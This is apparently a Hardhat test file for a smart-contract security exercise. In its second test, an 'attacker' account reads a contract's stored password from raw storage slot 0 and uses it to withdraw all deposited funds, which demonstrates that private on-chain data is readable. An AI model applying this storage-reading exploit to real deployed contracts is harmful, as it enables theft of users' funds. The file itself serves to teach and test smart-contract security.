const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Sensitive Data Read", function () {
  async function deployFixture() {
    const [owner, attacker] = await ethers.getSigners();
    const SensitiveData = await ethers.getContractFactory("SensitiveData");
    const sensitiveData = await SensitiveData.deploy(
      ethers.encodeBytes32String("myPassword")
    );

    return { sensitiveData, owner, attacker };
  }
  it("Deploy should be, and owner should be able to depost and withdraw", async function () {
    const { sensitiveData, owner } = await loadFixture(deployFixture);
    expect(await ethers.provider.getBalance(sensitiveData.target)).to.equal(
      "0"
    );
    await sensitiveData.deposit({ value: ethers.parseEther("5000") });
    const ownerBalance = await ethers.provider.getBalance(owner.getAddress());
    expect(await ethers.provider.getBalance(sensitiveData.target)).to.equal(
      ethers.parseEther("5000")
    );
    await sensitiveData.withdraw(ethers.encodeBytes32String("myPassword"));
    expect(await ethers.provider.getBalance(sensitiveData.target)).to.equal(
      "0"
    );
    expect(ownerBalance).be.lessThan(
      await ethers.provider.getBalance(owner.getAddress())
    );
  });

  it("Attacker is able to read the password and withdraw", async function () {
    const { sensitiveData, owner, attacker } = await loadFixture(deployFixture);
    expect(await ethers.provider.getBalance(sensitiveData.target)).to.equal(
      "0"
    );
    await sensitiveData.deposit({ value: ethers.parseEther("5000") });
    expect(await ethers.provider.getBalance(sensitiveData.target)).to.equal(
      ethers.parseEther("5000")
    );
    const attackerBalance = await ethers.provider.getBalance(attacker.address);
    const password = await ethers.decodeBytes32String(
      await ethers.provider.getStorage(sensitiveData.target, 0)
    );
    console.log("Recovered Password: ", password);
    await sensitiveData
      .connect(attacker)
      .withdraw(ethers.encodeBytes32String(password));

    expect(await ethers.provider.getBalance(sensitiveData.target)).to.equal(
      "0"
    );
    expect(attackerBalance).be.lessThan(await ethers.provider.getBalance(attacker.address));
  });
});
